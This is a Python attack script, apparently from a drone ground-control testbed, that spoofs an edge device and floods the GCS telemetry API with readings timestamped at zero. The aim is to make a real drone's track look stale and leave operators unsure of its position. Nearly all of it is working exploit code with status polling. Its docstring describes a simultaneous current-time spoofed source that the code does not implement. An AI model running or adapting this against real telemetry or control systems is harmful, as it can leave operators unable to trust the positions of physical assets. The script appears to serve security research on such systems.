"""
Timestamp Rollback / Track Staleness Poisoning 공격
독창 시나리오 #9 | IEEE TIFS 2022 "Time-Based Attacks on CPS"

GCS 취약점: state.py _source_sample_from_external()
    age_s = abs(requested_time_s - frame_time_s)
    stale  = age_s > max(10, scenario.step_s * 3)

공격 전략:
  - 합법적 엣지(edge-dronebot-01)와 동일한 asset_id로 텔레메트리를 주입
  - time_s = 0 (에포크 시작값) → age_s = current_timeline_s ≈ 100+
  - stale=True 로 판정되어 정상 소스가 융합 우선순위 최하위로 밀림
  - 동시에 공격자 소스(time_s=현재)를 주입하면 공격자 소스가 fused_position 결정

결과:
  - 대시보드 트랙 표: 정상 자산이 "노후 신호" 표시
  - 운용자가 실제 위치 신뢰 불가 → 판단 마비
  - stale 판정된 소스는 신뢰도 가산 없음 → 자산 상태 불명확
"""
from __future__ import annotations

import argparse
import random
import time
from .common import GcsClient, wait_for_gcs


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Timestamp Rollback 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="small-dronebot-01")
    parser.add_argument("--spoof-edge-id", default="edge-attack-tsroll-01")
    parser.add_argument("--stale-time-s",  type=int, default=0,
                        help="주입할 과거 time_s (0 = 에포크 시작 = 항상 노후)")
    parser.add_argument("--interval-s",    type=float, default=1.0)
    parser.add_argument("--duration-s",    type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 현재 타임라인 확인
    current_timeline_s = 0
    try:
        timeline = client.get("/api/timeline")
        current_timeline_s = timeline.get("payload", {}).get("end_s", 0)
        print(f"[ts_rollback] 현재 타임라인 끝: {current_timeline_s}s", flush=True)
    except Exception as e:
        print(f"[ts_rollback] 타임라인 조회 실패: {e}", flush=True)

    expected_age = current_timeline_s - args.stale_time_s
    print(
        f"[ts_rollback] 공격 시작\n"
        f"  대상: {args.target_asset}\n"
        f"  주입 time_s: {args.stale_time_s} (예상 age: {expected_age}s → stale=True 확정)\n"
        f"  원리: stale = age_s > max(10, step_s * 3)",
        flush=True,
    )

    # 위장 엣지 등록
    try:
        client.post("/api/edge/devices/register", {
            "edge_id":          args.spoof_edge_id,
            "device_type":      "uav_edge",
            "asset_ids":        [args.target_asset],
            "authority":        "EXTERNAL-ATTACKER",
            "link_profiles":    ["rf_spoofed"],
            "software_version": "tsroll-0.1",
        })
    except Exception:
        pass

    start = time.time()
    tick = 0

    while (time.time() - start) < args.duration_s:
        # Phase A: 과거 timestamp로 정상 자산 소스 오염
        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         args.target_asset,
                "time_s":           args.stale_time_s,   # ← 핵심: 과거값 고정
                "position":         [200.0 + random.gauss(0, 1),
                                     -220.0 + random.gauss(0, 1),
                                     95.0],
                "velocity_mps":     [14.0, 1.2, 0.1],
                "heading_deg":      (tick * 12) % 360,
                "status":           "edge-live",
                "source":           "TS-ROLLBACK",
                "source_id":        args.spoof_edge_id,
                "source_type":      "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": 0.88,    # 높은 confidence지만 stale=True라 밀림
                "link_profile":     "rf_spoofed",
                "battery_wh":       690.0,
            })
        except Exception as e:
            print(f"[ts_rollback] 주입 오류: {e}", flush=True)

        # 주입 후 트랙 상태 확인
        if tick % 5 == 0:
            try:
                tracks = client.get("/api/tracks")
                for track in (tracks.get("payload", {}).get("tracks") or []):
                    if track.get("asset_id") == args.target_asset:
                        print(
                            f"[ts_rollback] tick={tick:04d} | "
                            f"stale={track.get('stale')} | "
                            f"confidence={track.get('confidence')} | "
                            f"source_count={track.get('source_count')} | "
                            f"primary={track.get('primary_source_id')}",
                            flush=True,
                        )
            except Exception:
                pass

        tick += 1
        time.sleep(args.interval_s)

    print("[ts_rollback] 공격 종료", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
